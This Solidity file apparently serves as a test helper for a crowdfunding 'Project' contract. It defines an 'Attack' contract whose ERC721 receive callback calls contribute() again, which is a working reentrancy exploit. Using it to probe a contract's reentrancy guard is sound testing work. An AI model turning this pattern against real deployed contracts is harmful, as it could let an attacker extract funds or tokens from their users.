//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.9;

import "../Project.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Attack is IERC721Receiver {
    address public victim;
    bool public isCalled;

    function setVictim(address a) external payable {
        victim = a;
        isCalled = false;
    }

    function attack(uint256 x) external payable {
        Project(victim).contribute{value: x}();
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        if (!isCalled) {
            isCalled = true;
            Project(victim).contribute{value: 1 ether}();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
